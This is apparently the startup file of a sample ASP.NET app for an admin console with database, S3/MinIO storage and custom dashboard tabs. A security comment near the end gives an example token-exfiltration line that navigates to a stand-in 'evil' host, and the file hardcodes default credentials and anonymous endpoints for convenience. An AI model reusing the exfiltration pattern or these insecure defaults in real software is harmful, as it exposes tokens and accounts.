using Winche.Console;
using Winche.Console.Sample;
using Winche.Console.Tabs;
using Winche.Database.DependencyInjection;
using Winche.Storage.DependencyInjection;
using Winche.Storage.S3.DependencyInjection;

var builder = WebApplication.CreateBuilder(args);

var connectionString = builder.Configuration["Winche:ConnectionString"]
    ?? throw new InvalidOperationException("Set Winche:ConnectionString (see appsettings.json).");

builder.Services.AddWincheDatabase(cfg => cfg.ConnectionString = connectionString);
builder.Services.AddWincheStorage(opts =>
{
    opts.ConnectionString = connectionString;
    opts.UseS3Archive(s3 =>
    {
        s3.BucketName = builder.Configuration["Storage:Bucket"] ?? "winche-sample";
        s3.ServiceUrl = builder.Configuration["Storage:ServiceUrl"] ?? "http://localhost:9000";
        s3.AccessKey = builder.Configuration["Storage:AccessKey"] ?? "minioadmin";
        s3.SecretKey = builder.Configuration["Storage:SecretKey"] ?? "minioadmin";
        s3.RegionName = "us-east-1";
        s3.ForcePathStyle = true;   // required for MinIO
    });
});

builder.Services.AddWincheConsole(o =>
{
    o.ConnectionString = connectionString;
    o.SeedAdminEmail = "admin@winche.local";
    o.SeedAdminPassword = "Admin123!";

    o.AddDatabaseTab(b => b.UseRulesEditor());   // Database tab + its Rules sub-tab
    o.AddStorageTab(b => b.UseRulesEditor());     // Storage tab + its Rules sub-tab

    // Custom tabs — declarative dashboards rendered by the console from its widget catalog.
    o.AddTab("analytics", "Analytics", tab =>
    {
        tab.Icon = "chart-bar";
        tab.MinRole = ConsoleRole.Member;
        tab.Layout(new Filter(new Select("range", ["7 days", "30 days", "90 days"]),
        [
            new StatRow<AnalyticsTabProvider>(d => d.Kpis),
            new Row([
                new Chart<AnalyticsTabProvider>(d => d.Signups, ChartKind.Line) { Flex = 2 },
                new Table<AnalyticsTabProvider>(d => d.Recent) { Flex = 1 },
            ]),
            new Section("Breakdown", "Switch the view to swap the panel below", [
                new Filter(new Select("view", ["Signups", "Revenue"]), v => v switch
                {
                    "Signups" => new Node[] { new Chart<AnalyticsTabProvider>(d => d.SignupsBar, ChartKind.Bar) },
                    _         => new Node[] { new StatRow<AnalyticsTabProvider>(d => d.Revenue) },
                }),
            ]),
        ]));
    });

    o.AddTab("traffic", "Traffic", tab =>
    {
        tab.Icon = "report-analytics";
        tab.MinRole = ConsoleRole.Viewer;
        tab.Layout(new Column([
            new StatRow<TrafficTabProvider>(d => d.Totals),
            new Chart<TrafficTabProvider>(d => d.Byday, ChartKind.Bar),
        ]));
    });

    o.AddTab("notes", "Notes", tab =>
    {
        tab.Icon = "table";
        tab.MinRole = ConsoleRole.Viewer;
        tab.Layout(new Column([
            new StatRow<NotesTabProvider>(d => d.Summary),
            new Embed("note-editor", "/plugins/notes") { MinHeight = 160 },
        ]));
    });
});

var app = builder.Build();

await app.InitializeWincheDatabaseAsync();
await app.InitializeWincheStorageAsync();
await SampleData.SeedAsync(app.Services);

app.MapGet("/", () => Results.Redirect("/_console"));

// Sample escape-hatch island, served same-origin so the console can frame it and cookies flow.
// NOTE: these endpoints are anonymous for brevity; a real plugin should require authorization.
app.MapGet("/plugins/notes", (HttpContext http) =>
{
    // The island holds a bearer token, so it must not be able to exfiltrate it. connect-src 'self' blocks
    // fetch/XHR/WebSocket exfil; default-src 'self' blocks image-beacon exfil; form-action 'self' blocks a
    // cross-origin form POST. (Self-navigation exfil — location = "https://evil/?t=" + token — can't be stopped
    // by CSP; the primary defense there is island code correctness.) 'unsafe-inline' on script-src/style-src is
    // only needed because this sample inlines its <script> and <style>; a real plugin ships bundled assets with a
    // nonce. (Without style-src, default-src 'self' blocks the inline <style> and the island renders collapsed.)
    http.Response.Headers["Content-Security-Policy"] =
        "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'";
    return Results.Content(NotesIsland.Html, "text/html");
});
app.MapPost("/plugins/api/notes", (NoteRequest req) => Results.Ok(new NoteCountResponse(NoteStore.Add(req.Text))));

app.MapWincheConsole("/_console");

app.Run();
